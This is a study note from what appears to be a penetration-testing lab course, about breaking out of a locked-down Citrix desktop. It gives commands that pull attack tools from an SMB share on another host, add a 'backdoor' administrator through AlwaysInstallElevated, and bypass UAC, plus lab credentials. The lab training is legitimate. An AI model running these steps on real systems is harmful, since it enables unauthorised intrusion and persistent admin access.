# NOTE — Citrix Breakout

## ID
2400

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 24 — Citrix Breakout

## Description
Covers breaking out of locked-down Citrix/restricted desktop environments by abusing Windows dialog boxes, UNC paths, alternate file explorers, and escalating via AlwaysInstallElevated + UAC bypass to reach Administrator.

## Tags
citrix, breakout, dialog-box, uac-bypass, alwaysinstallelevated, privilege-escalation

## Commands
- `xfreerdp /v:<TARGET_IP> /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution`
- `smbserver.py -smb2support share $(pwd)`
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- `Import-Module .\PowerUp.ps1`
- `Write-UserAddMSI`
- `runas /user:backdoor cmd`
- `Import-Module .\Bypass-UAC.ps1`
- `Bypass-UAC -Method UacMethodSysprep`

## What This Section Covers
Citrix and similar virtualization platforms (AWS AppStream, CyberArk PSM, kiosks) deliver restricted desktops where `cmd.exe`, `powershell.exe`, and File Explorer directory browsing are locked down via Group Policy. The core methodology is: (1) obtain a dialog box, (2) use it for command execution, (3) escalate privileges. This section walks through every stage — from bypassing path restrictions with UNC paths in Paint's Open dialog, to SMB-based tool transfer, to privesc via AlwaysInstallElevated and UAC bypass.

## Methodology
1. RDP into the Ubuntu jump host with `xfreerdp /v:<IP> /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution`, then browse to `http://humongousretail.com/remote/` and log into Citrix as `pmorgan:Summer1Summer!` (domain `htb.local`). Click **Default Desktop** to download and open `launch.ica`.
2. Inside the restricted Citrix environment, open **MS Paint** from the Start Menu. Go to **File → Open** to trigger a Windows dialog box.
3. In the dialog's File Name field, enter the UNC path `\\127.0.0.1\c$\users\pmorgan` with File Type set to **All Files**, then press Enter. This bypasses Group Policy folder restrictions since dialog boxes don't enforce the same policies as Explorer.
4. Navigate to `Downloads`, right-click `flag.txt`, and open with Notepad to grab the user flag.
5. On the Ubuntu host, start an SMB server: `smbserver.py -smb2support share $(pwd)` from the `~/Tools` directory (contains `pwn.exe`, `PowerUp.ps1`, `Bypass-UAC.ps1`, `Explorer++.exe`).
6. Back in Paint's Open dialog, navigate to `\\10.13.38.95\share` (the Ubuntu host's IP). Right-click `pwn.exe` and select **Open** to spawn a `cmd.exe` shell — `pwn.exe` is a simple compiled C binary that calls `system("C:\\Windows\\System32\\cmd.exe")`.
7. From cmd, upgrade to PowerShell and copy tools: `powershell -ep bypass`, `cd C:\Users\Public`, `xcopy \\10.13.38.95\share\PowerUp.ps1 .`, `xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .`
8. Run `Import-Module .\PowerUp.ps1` then `Write-UserAddMSI` to generate `UserAdd.msi` on the desktop. Confirm AlwaysInstallElevated is set in both HKCU and HKLM registry keys (both must be `0x1`).
9. Execute `.\UserAdd.msi` and create user `backdoor:T3st@123` in the **Administrators** group. The password must meet complexity requirements.
10. Run `runas /user:backdoor cmd` to get a shell as the new admin user.
11. UAC still blocks access to `C:\Users\Administrator`. Bypass it: `powershell -ep bypass`, `cd C:\Users\Public`, `Import-Module .\Bypass-UAC.ps1`, `Bypass-UAC -Method UacMethodSysprep`. A new elevated PowerShell window opens.
12. Confirm elevation with `whoami /priv`, then read `type C:\Users\Administrator\Desktop\flag.txt`.

## Multi-step Workflow (optional)
```
# --- On Ubuntu jump host (terminal) ---
cd ~/Tools && sudo smbserver.py -smb2support share $(pwd)

# --- Inside Citrix restricted env (cmd from pwn.exe) ---
powershell -ep bypass
cd C:\Users\Public
xcopy \\10.13.38.95\share\PowerUp.ps1 .
xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .
Import-Module .\PowerUp.ps1
Write-UserAddMSI

# Run the MSI, create backdoor:T3st@123 in Administrators group
.\UserAdd.msi

# Switch to new admin user
runas /user:backdoor cmd

# In new cmd as backdoor:
powershell -ep bypass
cd C:\Users\Public
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep

# In elevated shell:
type C:\Users\Administrator\Desktop\flag.txt
```

## Key Takeaways
- Windows dialog boxes (Open, Save As, Import, Export, Print, Help) do **not** enforce the same Group Policy folder restrictions as File Explorer — they are the primary breakout vector in locked-down environments.
- UNC paths (`\\127.0.0.1\c$\...`) bypass path restrictions in dialog boxes because they access the admin share rather than going through Explorer's policy-checked navigation.
- `pwn.exe` is just a compiled `system("cmd.exe")` call — in real engagements you can compile your own or transfer any portable binary (Explorer++, cmd wrapper, reverse shell) via SMB.
- **AlwaysInstallElevated** requires both HKCU and HKLM keys set to `0x1` to be exploitable. PowerUp's `Write-UserAddMSI` automates the MSI creation.
- Even after adding a user to the Administrators group, UAC prevents accessing protected directories until you perform a UAC bypass — admin group membership alone is not enough.
- Alternative tools to remember for restricted environments: Explorer++ (portable file manager that ignores GP folder restrictions), SmallRegistryEditor / Uberregedit (bypass blocked `regedit`), and Q-Dir.
- Beyond dialog boxes, other breakout vectors include: accessibility features (Sticky Keys → Control Panel, Magnifier, Narrator), keyboard shortcuts (Win+R, Win+E, Ctrl+Alt+Del), hyperlinks in Help/About pages that launch a browser, and dragging files onto `.bat` scripts.

## Gotchas
- Wait at least 5 minutes after spawning the target before starting — the Citrix environment needs time to initialize. Disregard the licensing popup message.
- The password for the MSI-created user must meet Windows complexity requirements (uppercase + lowercase + number + special char, 8+ chars) — `T3st@123` works; a simple password will silently fail.
- The Bypass-UAC script using `UacMethodSysprep` spawns a **new window** — your original shell stays at the same privilege level. Work in the new elevated window.
- If File Explorer can't copy files from the SMB share (common in locked-down Citrix), use Explorer++ or right-click → Open directly from the Paint dialog to execute binaries. `xcopy` from cmd also works.
- The `pwn.exe` binary is custom-compiled from `pwn.c` — don't expect it outside this lab. The pattern to remember is: compile a minimal C program that calls `system("cmd.exe")`, transfer it, and execute from a dialog box.

## Additional Resources
- [Breaking out of Citrix and other Restricted Desktop Environments — Pen Test Partners](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/) — Comprehensive guide covering dialog box abuse, accessibility shortcuts, registry editors, and Group Policy bypass techniques in Citrix/RDS/AppStream environments.
- [Breaking out of Windows Environments — Node Security](https://node-security.com/posts/breaking-out-of-windows-environments/) — Quick-reference checklist of breakout techniques: dialog boxes, Help/About hyperlinks, Sticky Keys (Shift×5), Magnifier (Win++), Narrator (Win+Enter), startup interruption, keyboard shortcuts, restricted CMD shell escapes, and `.bat` file drag-and-drop tricks for when cmd/PowerShell are blocked.
